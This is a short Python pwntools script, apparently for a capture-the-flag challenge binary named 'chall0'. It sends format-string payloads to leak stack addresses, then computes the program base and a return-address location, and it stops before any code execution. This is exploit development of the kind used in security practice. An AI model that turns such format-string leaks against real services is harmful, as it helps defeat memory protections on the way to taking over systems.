from pwn import *

script = """
b *main+188
c
si
"""

# 0x00005c998b91a35e - 0x5c998b919000 = 0x135e

def leak_func(p, index):
    p.recvuntil(b"): ")
    
    payload = b''    # padding
    payload += b'AAAABBBBCCCC' # %x$p
    payload += f'%{index}$p'.encode()

    p.sendline(payload)
    leaked = p.recvline().strip().decode()
    print(leaked)
    foo = leaked.split('0x')[1]
    print(foo)
    return foo

def exploit():
    # p = process('./chall0')
    p = gdb.debug('./chall0', gdbscript=script)

    base = int(leak_func(p, 23), 16) - 0x135e
    print('The base of the program is : ', hex(base))
    
    rip = int(leak_func(p, 21), 16) - 400
    print('The rip of the program is : ', hex(rip))


exploit()
